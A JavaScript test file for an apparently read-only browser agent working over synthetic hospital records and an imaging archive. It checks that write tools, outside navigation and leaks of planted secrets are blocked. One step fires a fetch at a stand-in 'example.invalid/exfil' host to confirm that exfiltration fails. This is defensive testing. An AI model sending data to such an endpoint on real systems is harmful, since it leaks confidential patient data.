import test from 'node:test';
import assert from 'node:assert/strict';
import { once } from 'node:events';
import { chromium } from 'playwright-core';
import { createMockServer } from '../scripts/mock-server.js';
import { createActionService } from '../src/actions.js';
import { loadConfig } from '../src/config.js';
import { dispatchTool } from '../src/agent-tools.js';
import { runDemo } from '../src/agent-runner.js';

test('Chromium real + SIHOSP/PACS sintéticos + ciclo de tools Agents API simulado', async t => {
  const mock = createMockServer().listen(0, '127.0.0.1');
  t.after(() => mock.close());
  await once(mock, 'listening');
  const origin = `http://127.0.0.1:${mock.address().port}`;
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  t.after(() => browser.close());
  // Bypass fixture CSP only in this test to exercise the network guard itself.
  const context = await browser.newContext({ serviceWorkers: 'block', bypassCSP: true });
  const page = await context.newPage();
  await page.goto(origin + '/login.html');
  // Test harness simulates the HUMAN setup, never exposed as agent tools.
  await page.getByLabel('Usuario ficticio').fill('demo');
  await page.getByLabel('Clave ficticia').fill('demo');
  await Promise.all([page.waitForURL('**/mock-sihosp.html*'), page.getByRole('button', { name: 'Entrar manualmente a la demo' }).click()]);
  const config = loadConfig({ DEMO_ORIGIN: origin });
  const actions = createActionService({ config, getPage: async () => page });
  await assert.rejects(() => actions.execute('read'));
  await actions.lock();
  let before = page.url();
  for (const name of ['click', 'type', 'submit', 'upload']) {
    await assert.rejects(() => dispatchTool(actions, name, {}));
    assert.equal(page.url(), before);
  }
  await assert.rejects(() => actions.execute('navigate', 'https://pacs.fcm.unc.edu.ar/viewer/index.php'));
  assert.equal(page.url(), before);
  await page.evaluate(() => {
    const form = document.createElement('form');
    form.textContent = 'SYNTHETIC_SECRET_NOT_FOR_AGENT';
    const input = document.createElement('input'); input.value = 'SYNTHETIC_PASSWORD'; form.append(input);
    document.body.append(form);
    const hidden = document.createElement('div'); hidden.hidden = true; hidden.textContent = 'SYNTHETIC_HIDDEN_SECRET'; document.body.append(hidden);
  });
  const read = await actions.execute('read');
  assert.match(read.text, /DEMO-0001/);
  assert.doesNotMatch(read.text, /SYNTHETIC_(SECRET|PASSWORD|HIDDEN)/);
  const attempts = await page.evaluate(async () => {
    const out = [];
    for (const [url, method] of [['/mock-sihosp.html', 'POST'], ['/save', 'GET'], ['https://example.invalid/exfil', 'GET']]) {
      try { await fetch(url, { method }); out.push('allowed'); } catch { out.push('blocked'); }
    }
    return out;
  });
  assert.deepEqual(attempts, ['blocked', 'blocked', 'blocked']);
  const script = [
    ['status', {}], ['navigate', { value: origin + '/mock-sihosp.html' }], ['find', { value: 'DEMO-0001' }], ['read', {}],
    ['navigate', { value: origin + '/mock-pacs.html' }], ['read', {}], ['back', {}], ['forward', {}], ['reload', {}]
  ];
  let cursor = 0;
  const results = [];
  const client = {
    create: async request => { assert.equal(request.environment.type, 'none'); return { id: 'sess_synthetic' }; },
    retrieve: async () => ({ status: 'requires_action', required_actions: cursor < script.length ? [{ type: 'function_call', turn_id: 'turn_demo', call_id: `call_${cursor}`, name: script[cursor][0], arguments: script[cursor][1] }] : [] }),
    results: async (_id, events) => { results.push(events[0]); cursor++; },
    turns: async () => ({ data: [{ id: 'turn_demo', subagent_id: null, status: cursor === script.length ? 'completed' : 'waiting' }] }),
    items: async () => ({ data: [{ type: 'message', turn_id: 'turn_demo', role: 'assistant', phase: 'final_answer', status: 'completed', content: [{ type: 'output_text', text: 'Datos sintéticos DEMO-0001.' }] }], has_more: false }),
    cancel: async () => assert.fail('No debe cancelar una prueba correcta')
  };
  const result = await runDemo({ client, actions, config, pollMs: 0 });
  assert.equal(result.toolCalls, 9);
  assert.equal(result.toolErrors, 0);
  assert.ok(results.every(e => e.success));
  assert.match(JSON.parse(results[5].output).text, /DEMO-EST-0001/);
  await actions.unlock();
  await assert.rejects(() => actions.execute('read'));
});
